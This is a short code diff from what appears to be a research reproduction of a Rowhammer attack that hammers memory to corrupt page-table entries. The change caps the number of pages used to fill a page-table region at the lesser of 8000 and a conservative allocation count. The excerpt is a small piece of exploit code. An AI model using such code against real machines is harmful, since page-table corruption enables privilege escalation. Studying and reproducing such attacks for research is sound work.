@@ -59,8 +59,7 @@ first_PT_region_attack (uint64_t num_alloc_init, double threshold,
   /* Step 3 of Paper: Repeat Hammer On PTEs til Corruption */
   /****************************************************************/
   bool found_mismatch = false;
-  uint64_t pages_to_fill_region = 8000; // An estimate of around 8000 is enough
-                                        // to fill the new PT region.
+  uint64_t pages_to_fill_region = std::min ((uint64_t)8000, conservative_alloc);
   while (!found_mismatch)
     {
       // On Failure, Re-order and try again
